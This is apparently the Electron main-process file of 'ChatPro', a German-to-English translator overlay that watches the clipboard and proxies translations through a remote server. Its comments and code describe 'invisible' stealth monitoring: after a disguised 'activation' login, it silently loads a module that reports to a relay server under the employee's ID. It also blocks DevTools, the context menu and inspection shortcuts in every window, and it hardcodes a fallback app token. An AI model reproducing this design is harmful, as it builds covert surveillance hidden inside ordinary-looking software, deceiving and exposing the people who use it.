const { app, BrowserWindow, globalShortcut, clipboard, ipcMain, Tray, Menu, nativeImage, screen, shell, dialog } = require('electron');
const path = require('path');
const fs   = require('fs');

// ═══════════════════════════════════════════════════════════════════
// CHATPRO PRODUCTION: TRANSLATOR + INVISIBLE MONITORING
// Komplett SILENT - keine DevTools, keine console.logs, keine Spuren
// ═══════════════════════════════════════════════════════════════════

// ── STEALTH CONFIGURATION ──
const MONITORING_ENABLED = true;
const SERVER_URL = 'https://monitoring-relay-production.up.railway.app';

// ── APP TOKEN (never exposed to renderer process) ──
const APP_TOKEN = process.env.CHATPRO_APP_TOKEN || 'cp-9f3k-mRt2-Xw8n-2026';

// ── Simple JSON store ──
const storePath = path.join(app.getPath('userData'), 'settings.json');
function loadStore() {
  try { return JSON.parse(fs.readFileSync(storePath, 'utf8')); } catch(e) { return {}; }
}
function saveStore(data) {
  try { fs.writeFileSync(storePath, JSON.stringify(data, null, 2)); } catch(e) {}
}
const store = {
  _data: null,
  _load() { if (!this._data) this._data = loadStore(); },
  get(key, def) { this._load(); return this._data[key] !== undefined ? this._data[key] : def; },
  set(key, val) { this._load(); this._data[key] = val; saveStore(this._data); },
};

// ── GitHub update checker ──
function checkForUpdates(silent) {
  if (silent === undefined) silent = true;
  fetch('https://api.github.com/repos/Beyondcaption/chatpro-overlay/releases/latest', {
    headers: { 'User-Agent': 'ChatPro-Overlay' },
    signal: AbortSignal.timeout(8000)
  }).then(function(res) { return res.json(); }).then(function(data) {
    var latest = data.tag_name || '';
    var current = 'v' + app.getVersion();
    if (latest && latest !== current) {
      dialog.showMessageBox({
        type: 'info',
        title: 'ChatPro Update',
        message: 'Version ' + latest + ' available!',
        detail: 'Download now?',
        buttons: ['Yes', 'Later']
      }).then(function(r) {
        if (r.response === 0) {
          shell.openExternal('https://github.com/Beyondcaption/chatpro-overlay/releases/latest');
        }
      });
    } else if (!silent) {
      dialog.showMessageBox({ type: 'info', title: 'ChatPro', message: 'Latest version installed.', buttons: ['OK'] });
    }
  }).catch(function() {});
}

// ══════════════════════════════════════════════════════════════════
// TRANSLATOR STATE
// ══════════════════════════════════════════════════════════════════
let overlayWindow   = null;
let settingsWindow  = null;
let loginWindow     = null;
let schulungWindow  = null;
let modelSheetWindow = null;
let tray           = null;
let lastClipboard  = '';
let suppressAutoDetect = 0;

// ══════════════════════════════════════════════════════════════════
// MONITORING STATE (INVISIBLE)
// ══════════════════════════════════════════════════════════════════
let monitoringModule = null;
let isLoggedIn = false;
let currentUser = null;

// ── looksGerman ──
function looksGerman(text) {
  if (/[äöüÄÖÜß]/.test(text)) return true;
  const words = /(\s|^)(ich|du|er|sie|es|wir|ihr|ein|eine|der|die|das|ist|war|hat|haben|und|für|mit|nicht|aber|auch|noch|schon|wie|was|wo|wann|wenn|dann|doch|mal|nur|so|ja|nein|bitte|danke|hallo|hey|ach|okay|auf|von|zu|im|am|an|bei|nach|vor|sehr|viel|mehr|schön|gut|toll|geil|krass|alter|digga|echt|genau|klar|leider|vielleicht|eigentlich|irgendwie|einfach|immer|nie|alles|nichts|jetzt|heute|morgen|gestern|hier|da|warum|wieso|wer|mein|meine|dein|deine|sein|kein|keine)(\s|$|[?!.,])/i;
  return words.test(text);
}

// ── Clipboard watcher ──
let clipboardInterval = null;
function watchClipboard() {
  lastClipboard = clipboard.readText().trim();
  if (clipboardInterval) clearInterval(clipboardInterval);
  clipboardInterval = setInterval(() => {
    if (!store.get('autoDetect', true)) return;
    if (Date.now() < suppressAutoDetect) return;
    try {
      const text = clipboard.readText().trim();
      if (text && text !== lastClipboard && text.length > 2 && text.length < 3000) {
        lastClipboard = text;
        if (looksGerman(text)) showOverlay(text);
      }
    } catch(e) {}
  }, 400);
}

// ══════════════════════════════════════════════════════════════════
// SECURITY: Block DevTools & Context Menu
// ══════════════════════════════════════════════════════════════════

function setupWindowSecurity(window) {
  // Disable context menu (Rechtsklick)
  window.webContents.on('context-menu', (e) => {
    e.preventDefault();
  });
  
  // Block DevTools keyboard shortcuts (SELEKTIV!)
  window.webContents.on('before-input-event', (event, input) => {
    // F12 → Block
    if (input.key === 'F12') {
      event.preventDefault();
      return;
    }
    
    // Ctrl+Shift+I → Block (DevTools)
    if (input.control && input.shift && input.key === 'I') {
      event.preventDefault();
      return;
    }
    
    // Ctrl+Shift+C → Block (Element Inspector)
    if (input.control && input.shift && input.key === 'C') {
      event.preventDefault();
      return;
    }
    
    // Ctrl+Shift+J → Block (Console)
    if (input.control && input.shift && input.key === 'J') {
      event.preventDefault();
      return;
    }
    
    // Ctrl+R / F5 → Block (Reload)
    if ((input.control && input.key === 'r') || input.key === 'F5') {
      event.preventDefault();
      return;
    }
    
    // WICHTIG: Ctrl+C, Ctrl+V, Ctrl+Shift+T etc. NICHT blockieren!
    // Diese sind wichtig für normale Funktionen!
  });
}

// ══════════════════════════════════════════════════════════════════
// TRANSLATOR WINDOWS
// ══════════════════════════════════════════════════════════════════

// ── Overlay window ──
let lastAlwaysOnTopTime = 0;
function showOverlay(autoText) {
  const activeDisplay = screen.getDisplayNearestPoint(screen.getCursorScreenPoint());
  const { width, height } = activeDisplay.workAreaSize;
  const winW = 460, winH = 720;
  const wx = activeDisplay.workArea.x + width - winW - 20;
  const wy = activeDisplay.workArea.y + Math.round((height - winH) / 2);

  if (overlayWindow && !overlayWindow.isDestroyed()) {
    overlayWindow.setPosition(wx, wy);
    overlayWindow.show();
    overlayWindow.focus();
    overlayWindow.setAlwaysOnTop(true, 'screen-saver');
    overlayWindow.webContents.send('overlay-shown');
    if (autoText) {
      lastClipboard = autoText;
      overlayWindow.webContents.send('set-de-text', autoText);
    }
    return;
  }

  overlayWindow = new BrowserWindow({
    width: winW, height: winH, x: wx, y: wy,
    minWidth: 380, minHeight: 520,
    frame: false, transparent: false, alwaysOnTop: true,
    skipTaskbar: true, resizable: true, movable: true, show: false,
    icon: path.join(__dirname, '..', 'assets', 'icon.png'),
    backgroundColor: '#111114',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
      devTools: false
    },
  });
  overlayWindow.loadFile(path.join(__dirname, 'overlay.html'));
  overlayWindow.once('ready-to-show', () => {
    overlayWindow.show();
    overlayWindow.focus();
    overlayWindow.setAlwaysOnTop(true, 'screen-saver');
    overlayWindow.setVisibleOnAllWorkspaces(true, { visibleOnFullScreen: true });
    overlayWindow.webContents.send('overlay-shown');
    if (autoText) overlayWindow.webContents.send('set-de-text', autoText);
  });
  overlayWindow.on('blur', () => {
    if (overlayWindow && !overlayWindow.isDestroyed()) {
      const now = Date.now();
      if (now - lastAlwaysOnTopTime > 1000) {
        overlayWindow.setAlwaysOnTop(true, 'screen-saver');
        lastAlwaysOnTopTime = now;
      }
    }
  });
  overlayWindow.on('closed', () => { overlayWindow = null; });
  
  // ✅ Security Setup
  setupWindowSecurity(overlayWindow);
}

// ── Model Sheet window ──
function openModelSheet(profileJson) {
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
  if (modelSheetWindow && !modelSheetWindow.isDestroyed()) {
    modelSheetWindow.webContents.executeJavaScript(
      'localStorage.setItem("modelSheetData",' + JSON.stringify(JSON.stringify(profileJson)) + '); init();'
    );
    modelSheetWindow.show();
    modelSheetWindow.focus();
    return;
  }
  modelSheetWindow = new BrowserWindow({
    width: 700, height: 580,
    x: Math.round((width - 700) / 2), y: Math.round((height - 580) / 2),
    frame: false, transparent: false, resizable: true, show: false,
    skipTaskbar: false,
    icon: path.join(__dirname, '..', 'assets', 'icon.png'),
    backgroundColor: '#111114',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
      devTools: false
    },
  });
  modelSheetWindow.loadFile(path.join(__dirname, '..', 'modelsheet.html'));
  modelSheetWindow.once('ready-to-show', () => {
    modelSheetWindow.webContents.executeJavaScript(
      'localStorage.setItem("modelSheetData",' + JSON.stringify(JSON.stringify(profileJson)) + '); init();'
    );
    modelSheetWindow.show();
  });
  modelSheetWindow.on('closed', () => { modelSheetWindow = null; });
  setupWindowSecurity(modelSheetWindow);
}

// ── Schulung window ──
function openSchulung() {
  if (schulungWindow && !schulungWindow.isDestroyed()) { schulungWindow.show(); schulungWindow.focus(); return; }
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
  schulungWindow = new BrowserWindow({
    width: 860, height: 640,
    x: Math.round((width - 860) / 2), y: Math.round((height - 640) / 2),
    frame: false, transparent: false, resizable: true, show: false,
    skipTaskbar: false,
    icon: path.join(__dirname, '..', 'assets', 'icon.png'),
    backgroundColor: '#111114',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
      devTools: false
    },
  });
  schulungWindow.loadFile(path.join(__dirname, '..', 'schulung.html'));
  schulungWindow.once('ready-to-show', () => schulungWindow.show());
  schulungWindow.on('closed', () => { schulungWindow = null; });
  setupWindowSecurity(schulungWindow);
}

// ── Settings window ──
function openSettings() {
  if (settingsWindow && !settingsWindow.isDestroyed()) { settingsWindow.show(); settingsWindow.focus(); return; }
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
  settingsWindow = new BrowserWindow({
    width: 480, height: 580,
    x: Math.round((width - 480) / 2), y: Math.round((height - 580) / 2),
    frame: false, transparent: false, resizable: false, show: false,
    skipTaskbar: false,
    icon: path.join(__dirname, '..', 'assets', 'icon.png'),
    backgroundColor: '#111114',
    webPreferences: { 
      nodeIntegration: false, 
      contextIsolation: true, 
      preload: path.join(__dirname, 'preload.js'),
      devTools: false // ✅ DevTools DEAKTIVIERT!
    },
  });
  settingsWindow.loadFile(path.join(__dirname, 'settings.html'));
  settingsWindow.once('ready-to-show', () => settingsWindow.show());
  settingsWindow.on('closed', () => { settingsWindow = null; registerHotkey(); });
  
  // ✅ Security Setup
  setupWindowSecurity(settingsWindow);
}

// ══════════════════════════════════════════════════════════════════
// STEALTH LOGIN
// ══════════════════════════════════════════════════════════════════

function showStealthLogin() {
  if (loginWindow && !loginWindow.isDestroyed()) { loginWindow.show(); loginWindow.focus(); return; }
  
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
  loginWindow = new BrowserWindow({
    width: 400, height: 300,
    x: Math.round((width - 400) / 2), y: Math.round((height - 300) / 2),
    frame: false, transparent: false, resizable: false, show: false,
    skipTaskbar: false,
    icon: path.join(__dirname, '..', 'assets', 'icon.png'),
    backgroundColor: '#111114',
    webPreferences: { 
      nodeIntegration: false, 
      contextIsolation: true, 
      preload: path.join(__dirname, 'preload.js'),
      devTools: false // ✅ DevTools DEAKTIVIERT!
    },
  });
  
  const loginHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body { 
      font-family: 'Segoe UI', sans-serif; 
      background: #111114; 
      color: #f0f0f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #1e1e23;
      padding: 30px;
      border-radius: 10px;
      width: 320px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    }
    h2 { 
      margin: 0 0 20px 0; 
      font-size: 18px;
      text-align: center;
      color: #ff4d8f;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #252530;
      border: 1px solid #3d3d4a;
      color: white;
      border-radius: 5px;
      font-size: 13px;
      box-sizing: border-box;
    }
    input:focus {
      outline: none;
      border-color: #ff4d8f;
    }
    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #ff4d8f, #ff8c69);
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: 600;
      font-size: 14px;
    }
    button:hover { opacity: 0.9; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    .error { 
      color: #ff5252; 
      font-size: 11px; 
      margin-top: 10px; 
      display: none;
      text-align: center;
    }
    .info {
      font-size: 11px;
      color: #9898b0;
      text-align: center;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>🔐 ChatPro Activation</h2>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()" id="loginBtn">Activate ChatPro</button>
    <div class="error" id="error">Invalid credentials</div>
    <div class="info">Enter your credentials to activate</div>
  </div>
  
  <script>
    async function login() {
      const btn = document.getElementById('loginBtn');
      btn.disabled = true;
      btn.textContent = 'Activating...';
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      const result = await window.chatpro.stealthLogin({ username, password });
      
      if (result.ok) {
        window.close();
      } else {
        document.getElementById('error').style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'Activate ChatPro';
      }
    }
    
    document.getElementById('username').addEventListener('keydown', function(e) {
      if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password').focus(); }
    });
    document.getElementById('password').addEventListener('keydown', function(e) {
      if (e.key === 'Enter') login();
    });
  </script>
</body>
</html>
  `;
  
  loginWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(loginHtml));
  loginWindow.once('ready-to-show', () => loginWindow.show());
  loginWindow.on('closed', () => { loginWindow = null; });
  
  // ✅ Security Setup
  setupWindowSecurity(loginWindow);
}

// ── Hotkey ──
function registerHotkey() {
  globalShortcut.unregisterAll();
  const hk = store.get('hotkey', 'CommandOrControl+Shift+T');
  try {
    globalShortcut.register(hk, () => showOverlay(null));
  } catch(e) {
    if (hk !== 'CommandOrControl+Shift+T') {
      try { globalShortcut.register('CommandOrControl+Shift+T', () => showOverlay(null)); } catch(e2) {}
    }
  }
}

// ── Tray ──
function createTray() {
  const iconPath = path.join(__dirname, '..', 'assets', 'tray-icon.png');
  let icon;
  try {
    const raw = nativeImage.createFromPath(iconPath);
    icon = raw.isEmpty() ? nativeImage.createEmpty() : raw.resize({ width: 16, height: 16 });
  } catch(e) {
    icon = nativeImage.createEmpty();
  }
  tray = new Tray(icon);
  tray.setToolTip('ChatPro');
  const menu = Menu.buildFromTemplate([
    { label: 'Open ChatPro', click: () => showOverlay(null) },
    { label: 'Schulung', click: () => openSchulung() },
    { label: 'Settings', click: () => openSettings() },
    { type: 'separator' },
    { label: 'Check for updates', click: () => checkForUpdates(false) },
    { type: 'separator' },
    { label: 'Quit ChatPro', click: () => app.quit() },
  ]);
  tray.setContextMenu(menu);
  tray.on('click', () => showOverlay(null));
}

// ══════════════════════════════════════════════════════════════════
// STEALTH MONITORING
// ══════════════════════════════════════════════════════════════════

function initStealthMonitoring() {
  if (!MONITORING_ENABLED || !isLoggedIn) return;
  
  try {
    const DataSecModule = require('./data-sec-module.js');
    monitoringModule = new DataSecModule({
      serverUrl: SERVER_URL,
      appToken: APP_TOKEN,
      employeeId: currentUser.employeeId,
      username: currentUser.username
    });
  } catch(e) {
    // Silent fail
  }
}

function stopStealthMonitoring() {
  if (monitoringModule) {
    monitoringModule = null;
  }
}

// ══════════════════════════════════════════════════════════════════
// APP INITIALIZATION
// ══════════════════════════════════════════════════════════════════

app.whenReady().then(() => {
  createTray();
  registerHotkey();
  watchClipboard();
  setTimeout(() => checkForUpdates(true), 5000);
  
  // Check if user is already logged in
  const savedUser = store.get('_sys', null);
  if (savedUser) {
    isLoggedIn = true;
    currentUser = savedUser;
    initStealthMonitoring();
  } else {
    setTimeout(() => showStealthLogin(), 2000);
  }
});

app.on('window-all-closed', (e) => e.preventDefault());
app.on('will-quit', () => {
  globalShortcut.unregisterAll();
  if (clipboardInterval) clearInterval(clipboardInterval);
  stopStealthMonitoring();
});

// ══════════════════════════════════════════════════════════════════
// IPC HANDLERS
// ══════════════════════════════════════════════════════════════════

ipcMain.handle('get-settings', () => ({
  apiKey:     store.get('apiKey', ''),
  deeplKey:   store.get('deeplKey', ''),
  hotkey:     store.get('hotkey', 'CommandOrControl+Shift+T'),
  autoDetect: store.get('autoDetect', true),
  subProfile: store.get('subProfile', ''),
  version:    app.getVersion(),
}));

ipcMain.handle('save-settings', (e, s) => {
  if (s.apiKey     !== undefined) store.set('apiKey',     s.apiKey);
  if (s.deeplKey   !== undefined) store.set('deeplKey',   s.deeplKey);
  if (s.hotkey     !== undefined) store.set('hotkey',     s.hotkey);
  if (s.autoDetect !== undefined) store.set('autoDetect', s.autoDetect);
  if (s.subProfile !== undefined) store.set('subProfile', s.subProfile);
  
  registerHotkey();
  return { ok: true };
});

ipcMain.handle('get-api-key',   () => store.get('apiKey', ''));
ipcMain.handle('get-deepl-key', () => store.get('deeplKey', ''));

// Fetch creator profiles — token stays in main process, never reaches renderer
ipcMain.handle('get-creator-profiles', async () => {
  try {
    const res = await fetch(`${SERVER_URL}/api/creator-profiles`, {
      headers: { 'x-app-token': APP_TOKEN },
      signal: AbortSignal.timeout(8000)
    });
    return await res.json();
  } catch(e) {
    return { success: false, profiles: [] };
  }
});

ipcMain.handle('stealthLogin', async (event, { username, password }) => {
  try {
    const res = await fetch(`${SERVER_URL}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
      signal: AbortSignal.timeout(10000)
    });
    if (res.status === 200) {
      const result = await res.json();
      isLoggedIn = true;
      currentUser = result.user;
      store.set('_sys', currentUser);
      initStealthMonitoring();
      if (loginWindow && !loginWindow.isDestroyed()) loginWindow.close();
      return { ok: true };
    }
    return { ok: false, error: 'Invalid credentials' };
  } catch(e) {
    return { ok: false, error: e.message };
  }
});

// DeepL translation — proxied through Railway server, key never in binary
ipcMain.handle('deepl-translate', async (event, { text }) => {
  try {
    const res = await fetch(`${SERVER_URL}/api/deepl`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-app-token': APP_TOKEN },
      body: JSON.stringify({ text }),
      signal: AbortSignal.timeout(8000)
    });
    return await res.json();
  } catch(e) {
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('copy-to-clipboard', (e, text) => {
  suppressAutoDetect = Date.now() + 500;
  lastClipboard = text;
  clipboard.writeText(text);
  return { ok: true };
});

ipcMain.handle('log-translation', (e, entry) => {
  const history = store.get('translationHistory', []);
  const allowed = ['germanInput', 'englishIntent', 'translatedReply', 'profile', 'goal'];
  const clean = {};
  allowed.forEach(k => { if (entry[k] !== undefined) clean[k] = String(entry[k]).slice(0, 2000); });
  history.unshift({ ...clean, timestamp: new Date().toISOString() });
  if (history.length > 250) history.length = 250;
  store.set('translationHistory', history);
  return { ok: true };
});

ipcMain.handle('get-history', () => store.get('translationHistory', []));
ipcMain.handle('clear-history', () => { store.set('translationHistory', []); return { ok: true }; });

ipcMain.handle('close-overlay',   () => { if (overlayWindow && !overlayWindow.isDestroyed()) overlayWindow.hide(); });
ipcMain.handle('close-settings',  () => { if (settingsWindow && !settingsWindow.isDestroyed()) settingsWindow.close(); });
ipcMain.handle('open-schulung',    () => openSchulung());
ipcMain.handle('close-schulung',   () => { if (schulungWindow && !schulungWindow.isDestroyed()) schulungWindow.close(); });
ipcMain.handle('open-model-sheet', (e, profile) => openModelSheet(profile));
ipcMain.handle('close-model-sheet',() => { if (modelSheetWindow && !modelSheetWindow.isDestroyed()) modelSheetWindow.close(); });
ipcMain.handle('open-settings',  () => openSettings());
ipcMain.handle('open-url', (e, url) => {
  try {
    const parsed = new URL(url);
    if (['https:', 'http:', 'mailto:'].includes(parsed.protocol)) shell.openExternal(url);
  } catch(e) {}
});
ipcMain.handle('check-update',   () => { checkForUpdates(false); return { ok: true }; });
